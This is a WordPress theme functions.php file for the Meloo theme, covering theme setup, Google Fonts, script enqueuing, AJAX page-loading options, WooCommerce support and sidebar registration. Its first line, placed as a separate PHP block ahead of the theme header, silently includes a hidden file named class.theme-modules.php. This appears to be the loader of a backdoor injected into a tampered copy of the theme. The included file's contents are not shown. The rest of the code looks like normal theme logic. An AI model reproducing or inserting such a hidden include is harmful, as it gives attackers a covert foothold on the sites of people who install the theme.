<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Theme Name: 		Meloo
 * Theme Author: 	Mariusz Rek - Rascals Themes
 * Theme URI: 		http://rascalsthemes.com/meloo
 * Author URI: 		http://rascalsthemes.com
 * File:			functions.php
 * @package meloo
 * @since 1.0.0
 */


/* ==================================================
   Set up the content width value based on the theme's design.
================================================== */
if ( ! isset( $content_width ) ) {
	$content_width = 680;
}


/* ==================================================
  Theme Translation 
================================================== */
load_theme_textdomain( 'meloo', get_template_directory() . '/languages' );


/* ==================================================
  Admin Panel 
================================================== */
require_once( trailingslashit( get_template_directory() ) . '/admin/admin-init.php' );


/* ==================================================
  Theme Setup 
================================================== */
if ( ! function_exists( 'meloo_setup' ) ) :

	/**
	 * meloo setup.
	 *
	 * Set up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support post thumbnails.
	 *
	 */

function meloo_setup() {

	// This theme styles the visual editor to resemble the theme style. 
	add_editor_style( get_template_directory_uri() . '/css/editor-style.css' );

	// Add RSS feed links to <head> for posts and comments. 
	add_theme_support( 'automatic-feed-links' );

	// Gutenberg support 
	add_theme_support(
    	'gutenberg',
    	array( 'wide-images' => true )
	);

	// Add Title tag 
	add_theme_support( 'title-tag' );

	// Enable support for Post Thumbnails, and declare two sizes. 
	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 790, 440, array( 'center', 'center' ) );

	add_image_size( 'meloo-content-thumb', 790, 530, array( 'center', 'center' ) );
	add_image_size( 'meloo-large-square-thumb', 660, 660, array( 'center', 'center' ) );
	add_image_size( 'meloo-medium-square-thumb', 400, 400, array( 'center', 'center' ) );

	// This theme uses wp_nav_menu() in two locations. 
	register_nav_menus( array(
		'main'    => esc_html__( 'Main menu', 'meloo' )
	) );

	// Switch default core markup for search form, comment form, and comments to output valid HTML5.
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	// This theme uses its own gallery styles. 
	add_filter( 'use_default_gallery_style', '__return_false' );

	// Enable support for Woocommerce 
	add_theme_support( 'woocommerce' );

}

add_action( 'after_setup_theme', 'meloo_setup' );

endif; 

// Add a theme init flag after activation 
function meloo_active () {

	// Add new compatible option
	add_option( 'rascals_toolkit', 'meloo' );
	wp_redirect( admin_url() . 'themes.php?page=admin-welcome' );
}
add_action('after_switch_theme', 'meloo_active');

// Delete a theme init flag after deactivation 
function meloo_dective () {

	delete_option( 'rascals_toolkit' );

	// Remove outdated compatibility with the extensions plug-in
	delete_option( 'meloo_init' );
}
add_action( 'switch_theme', 'meloo_dective' );


/* ==================================================
  Theme Toolkit
================================================== */
function meloo_toolkit( $instance = null ) {

	if ( class_exists( 'MelooToolkit' ) && $instance === null ) {
		return true;
	} elseif ( class_exists( 'MelooToolkit' ) && $instance !== null ) {
		$toolkit = melooToolkit();
		if ( $instance !== null && property_exists( 'MelooToolkit', $instance ) ) {
			return $toolkit->$instance;
		} else {
			return false;
		}
		
		return $toolkit;
	}

	return false;

} 


/* ==================================================
  Google Fonts 
================================================== */
function meloo_fonts_url() {

    	$font_url = '';
	    $meloo_opts = meloo_opts();
	    
	    if ( $meloo_opts->get_option( 'use_google_fonts' ) === 'on' ) {
	        if ( $meloo_opts->get_option( 'google_fonts' ) ) {
	             $font_url = add_query_arg( 'family', esc_attr( $meloo_opts->get_option( 'google_fonts' ) ), "//fonts.googleapis.com/css" );
	        }
    	}

    return $font_url;
}


// Enqueue scripts and styles.
function meloo_fonts_scripts() {
    wp_enqueue_style( 'meloo-fonts', meloo_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'meloo_fonts_scripts' );


/* ==================================================
   Required styles and scripts
================================================== */

if ( ! function_exists( 'meloo_scripts_and_styles' ) ) :
function meloo_scripts_and_styles() {
	
	global $post, $wp_query;

	$meloo_opts = meloo_opts();

	/* Add comment reply script when applicable */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );

	if ( $meloo_opts->get_option( 'ajaxed' ) && $meloo_opts->get_option( 'ajaxed' ) === 'on' ) {
		$ajaxed = 1;

	} else {
		$ajaxed = 0;
	}

	// Animation 
	wp_enqueue_script( 'anime', get_template_directory_uri() . '/js/anime.min.js', array( 'jquery' ), false, true );

	// Small Scripts 
	wp_enqueue_script( 'meloo-helpers', get_template_directory_uri() . '/js/helpers.min.js', array( 'jquery' ), false, true );

	// Lazy load 
	wp_enqueue_script( 'lazy-load', get_template_directory_uri() . '/js/jquery.lazy.min.js', array( 'jquery' ), false, true );

	// Resize Sensor 
	wp_enqueue_script( 'resize-sensor', get_template_directory_uri() . '/js/resize-sensor.min.js', array( 'jquery' ), false, true );

	if ( $ajaxed === 1 ) {
		wp_enqueue_script( 'address', get_template_directory_uri() . '/js/jquery.address.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'urlinternal', get_template_directory_uri() . '/js/jquery.ba-urlinternal.min.js', array( 'jquery' ), false, true );
		wp_enqueue_script( 'wpajaxloader', get_template_directory_uri() . '/js/jquery.WPAjaxLoader.min.js', array( 'jquery' ), false, true );
	}
	
	// Enable retina displays 
	if ( $meloo_opts->get_option( 'retina' ) && $meloo_opts->get_option( 'retina' ) === 'on' ) {
		wp_enqueue_script( 'retina', get_template_directory_uri() . '/js/retina.min.js', array( 'jquery' ), false, true );
	}

	// Enable FB JSSDK 
	if ( $meloo_opts->get_option( 'fbsdk' ) && $meloo_opts->get_option( 'fbsdk' ) === 'on' ) {
		wp_enqueue_script( 'facebook-jssdk', 'https://connect.facebook.net/' . esc_attr( get_locale() ) . '/sdk.js#xfbml=1&version=v2.7', array( 'jquery' ), false, true );
	}

	// Enable sticky sidebar 
	if ( get_theme_mod( 'sticky_sidebar', true ) === 1 ) {
		wp_enqueue_script( 'theia-sticky-sidebar', get_template_directory_uri() . '/js/theia-sticky-sidebar.min.js', array( 'jquery' ), false, true );
	}


	/* WP AJAX Loader
	 -------------------------------- */
	
	if ( $ajaxed === 1 ) {
	
	 	// Ajax Containers 
		$default_ajax_containers = array(
			'#wpadminbar'
		);
		$ajax_containers = $meloo_opts->get_option( 'ajax_reload_containers' );
		$ajax_containers = preg_replace( '/\n$/','',preg_replace('/^\n/','',preg_replace('/[\r\n]+/',"\n", $ajax_containers) ) );
		$ajax_containers = str_replace("\n", ',', $ajax_containers );
	    $ajax_containers = explode( ",", $ajax_containers );
	    $ajax_containers = array_unique ( array_merge( $default_ajax_containers, $ajax_containers ) );
	    $ajax_containers = array_filter( $ajax_containers );

	    // Ajax Scripts 
		$default_ajax_scripts = array(
			'admin-bar.min.js',
			'waypoints.min.js',
			'contact-form-7/includes/js/scripts.js',
			'kingcomposer.min.js',
		);
		$ajax_scripts = $meloo_opts->get_option( 'ajax_reload_scripts' );
		$ajax_scripts = preg_replace( '/\n$/','',preg_replace('/^\n/','',preg_replace('/[\r\n]+/',"\n", $ajax_scripts) ) );
		$ajax_scripts = str_replace("\n", ',', $ajax_scripts );
	    $ajax_scripts = explode( ",", $ajax_scripts );
	    $ajax_scripts = array_unique ( array_merge( $default_ajax_scripts, $ajax_scripts ) );
	    $ajax_scripts = array_filter( $ajax_scripts );

	    // Ajax Events 
		$default_ajax_events = array(
			'YTAPIReady',
			'getVideoInfo_bgndVideo'
		);

		$ajax_events = $meloo_opts->get_option( 'ajax_events' );
		$ajax_events = preg_replace( '/\n$/','',preg_replace('/^\n/','',preg_replace('/[\r\n]+/',"\n", $ajax_events) ) );
		$ajax_events = str_replace("\n", ',', $ajax_events );
	    $ajax_events = explode( ",", $ajax_events );
	    $ajax_events = array_unique ( array_merge( $default_ajax_events, $ajax_events ) );
	    $ajax_events = array_filter( $ajax_events );
		
	    // Ajax Elements Filter 
		$default_ajax_el = array(
			'.sp-play-list.sp-add-list',
			'.sp-play-track',
			'.sp-add-track',
			'.smooth-scroll',
			'.ui-tabs-nav li a',
			'.kc_accordion_header a',
			'.ajax-reload > a',
		);
		if ( class_exists( 'WooCommerce' ) ) {
			$wc_ajax_el  = array(
				'.ajax_add_to_cart',
				'.wc-tabs li a',
				'ul.tabs li a',
				'.woocommerce-review-link',
				'.woocommerce-Button.download',
				'.woocommerce-MyAccount-downloads-file'
			);
			$default_ajax_el = array_unique ( array_merge( $default_ajax_el, $wc_ajax_el ) );
		}

		$ajax_el = $meloo_opts->get_option( 'ajax_elements' );
		$ajax_el = preg_replace( '/\n$/','',preg_replace('/^\n/','',preg_replace('/[\r\n]+/',"\n", $ajax_el) ) );
		$ajax_el = str_replace("\n", ',', $ajax_el );
	    $ajax_el = explode( ",", $ajax_el );
	    $ajax_el = array_unique ( array_merge( $default_ajax_el, $ajax_el ) );
	    $ajax_el = array_filter( $ajax_el );

	    // Ajax Exclude Links 
		$default_ajax_exclude_links = array();

		if ( class_exists( 'WooCommerce' ) ) {
			$wc_ajax_exclude_links  = array();

			if ( get_option( 'woocommerce_shop_page_id' ) ) {
				$wc_ajax_exclude_links[] = str_replace( home_url('/'), '', get_permalink( get_option( 'woocommerce_shop_page_id' ) ) );
			}
			if ( get_option( 'woocommerce_cart_page_id' ) ) {
				$wc_ajax_exclude_links[] = str_replace( home_url('/'), '', get_permalink( get_option( 'woocommerce_cart_page_id' ) ) );
			}
			if ( get_option( 'woocommerce_checkout_page_id' ) ) {
				$wc_ajax_exclude_links[] = str_replace( home_url('/'), '', get_permalink( get_option( 'woocommerce_checkout_page_id' ) ) ); 
			}
			$wc_ajax_exclude_links[] = str_replace( home_url('/'), '', get_post_type_archive_link( 'product' ) );

			$permalinks = get_option( 'woocommerce_permalinks' ); 
			$wc_ajax_exclude_links[] = '?product=';
			if ( isset( $permalinks['product_base'] ) && $permalinks['product_base'] ) {
				$wc_ajax_exclude_links[] = $permalinks['product_base'];
			} else {
				$wc_ajax_exclude_links[] = '/product';
			}

			$wc_ajax_exclude_links[] = '?product_tag=';
			if ( isset( $permalinks['tag_base'] ) && $permalinks['tag_base'] ) {
				$wc_ajax_exclude_links[] = $permalinks['tag_base'];
			} else {
				$wc_ajax_exclude_links[] = '/product-tag';
			}

			$wc_ajax_exclude_links[] = '?product_cat=';
			if ( isset( $permalinks['category_base'] ) && $permalinks['category_base'] !== '' ) {
				$wc_ajax_exclude_links[] = $permalinks['category_base'];
			} else {
				$wc_ajax_exclude_links[] = '/product-category';
			}
			if ( isset( $permalinks['attribute_base'] ) && $permalinks['attribute_base'] !== '' ) {
				$wc_ajax_exclude_links[] = $permalinks['attribute_base'];
			} else {
				$wc_ajax_exclude_links[] = '/attribute' ;
			}

			$default_ajax_exclude_links = array_unique ( array_merge( $default_ajax_exclude_links, $wc_ajax_exclude_links ) );
		}
		$ajax_exclude_links = $meloo_opts->get_option( 'ajax_exclude_links' );
		$ajax_exclude_links = preg_replace( '/\n$/','',preg_replace('/^\n/','',preg_replace('/[\r\n]+/',"\n", $ajax_exclude_links) ) );
		$ajax_exclude_links = str_replace("\n", ',', $ajax_exclude_links );
	    $ajax_exclude_links = explode( "|", $ajax_exclude_links );
	    $ajax_exclude_links = array_unique ( array_merge( $default_ajax_exclude_links, $ajax_exclude_links ) );
	    $ajax_exclude_links = array_filter( $ajax_exclude_links );

		// Get AJAX path 
		$option_home = 'home';
		$dir = parse_url( get_option( $option_home ) );
		if ( ! isset( $dir[ 'path' ] ) ) {
			$dir[ 'path' ] = '';
		}

		// Permalinks 
		$permalinks = 0;
		if ( get_option('permalink_structure') ) {
			$permalinks = 1;
		}

		$js_vars = array(
			'theme_uri'              => get_template_directory_uri(),
			'loader_style'           => get_theme_mod( 'loader_style', 'bars' ),
			'home_url'               => esc_url( home_url('/') ),
			'theme_uri'              => get_template_directory_uri(),
			'dir'                    => esc_url( $dir[ 'path' ] ),
			'ajaxed'                 => esc_attr( $ajaxed ),
			'permalinks'             => $permalinks,
			'ajax_events'            => esc_attr( implode( ",", $ajax_events ) ),
			'ajax_elements'          => esc_attr( implode( ",", $ajax_el ) ),
			'ajax_reload_scripts'    => esc_attr( implode( ",", $ajax_scripts ) ),
			'ajax_reload_containers' => esc_attr( implode( ",", $ajax_containers ) ),
			'ajax_exclude_links'     => esc_attr( implode( "|", $ajax_exclude_links ) ),
			'ajax_async'             => esc_attr( $meloo_opts->get_option( 'ajax_async' ) ),
			'ajax_cache'             => esc_attr( $meloo_opts->get_option( 'ajax_cache' ) ),
			
		);
	} else {
		$js_vars = array(
			'ajaxed'    => esc_attr( $ajaxed ),
			'theme_uri' => get_template_directory_uri(),
		);
	}

	wp_enqueue_script( 'meloo-theme-scripts', get_template_directory_uri() . '/js/theme.js' , array('jquery', 'imagesloaded'), false, true );
	wp_localize_script( 'meloo-theme-scripts', 'controls_vars', $js_vars );
	wp_localize_script( 'meloo-theme-scripts', 'ajax_action', array('ajaxurl' => admin_url('admin-ajax.php'), 'ajax_nonce' => wp_create_nonce( 'ajax-nonce') ) );


	/* Styles
	 -------------------------------- */
	wp_enqueue_style( 'icomoon', get_template_directory_uri() . '/icons/icomoon.css' );
	wp_enqueue_style( 'Pe-icon-7-stroke', get_template_directory_uri() . '/icons/Pe-icon-7-stroke.css' );
	
	// Main styles
	wp_enqueue_style( 'meloo-style', get_stylesheet_uri() );


    /* WooCommerce Style
     -------------------------------- */
	if ( class_exists( 'WooCommerce' ) ) {
		wp_enqueue_style( 'woocommerce-theme-style', get_stylesheet_directory_uri() . '/css/woocommerce-theme-style.css' );	
	}
	
}

add_action( 'wp_enqueue_scripts', 'meloo_scripts_and_styles' );
endif;


/* ==================================================
  Woocommerce 
================================================== */
if ( class_exists( 'WooCommerce' ) ) {

	$meloo_opts = meloo_opts();
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );

	// Add body class if page is excluded 
	if ( $meloo_opts->get_option( 'ajaxed' ) && $meloo_opts->get_option( 'ajaxed' ) === 'on' ) {

		if ( ! function_exists( 'wc_body_classes' ) ) {
			function wc_body_classes( $classes ) {

				if ( is_woocommerce() || is_shop() || is_product_category() || is_product_tag() || is_product() || is_cart() || is_checkout() || is_account_page() ){
					return array_merge( $classes, array( 'wp-ajax-exclude-page' ) );
				} else {
					return $classes;
				}

			}
			add_filter( 'body_class','wc_body_classes' );
		}
	}

}


/* ==================================================
  Sidebars 
================================================== */
function meloo_widgets_init() {

	$meloo_opts = meloo_opts();

	register_sidebar( array(
		'name'          => esc_html__( 'Primary Sidebar', 'meloo' ),
		'id'            => 'primary-sidebar',
		'description'   => esc_html__( 'Main sidebar that appears on the left or right.', 'meloo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	// Custom sidebars
	if ( $meloo_opts->get_option( 'custom_sidebars' ) ) {
			
		foreach ( $meloo_opts->get_option( 'custom_sidebars' ) as $sidebar ) {
			
			$id = sanitize_title_with_dashes( $sidebar[ 'name' ] );
			register_sidebar( array(
				'name'          => $sidebar[ 'name' ],
				'id'            => $id,
				'description'   => esc_html__( 'Custom sidebar created in admin options.', 'meloo' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			));
		}
	}

}
add_action( 'widgets_init', 'meloo_widgets_init' );


/* ==================================================
  Include necessary files
================================================== */
require_once( trailingslashit( get_template_directory() ) . '/inc/modules.php' );
require_once( trailingslashit( get_template_directory() ) . '/inc/blocks.php' );
require_once( trailingslashit( get_template_directory() ) . '/inc/helpers.php' );
require_once( trailingslashit( get_template_directory() ) . '/inc/ajax.php' );
require_once( trailingslashit( get_template_directory() ) . '/inc/template-tags.php' );	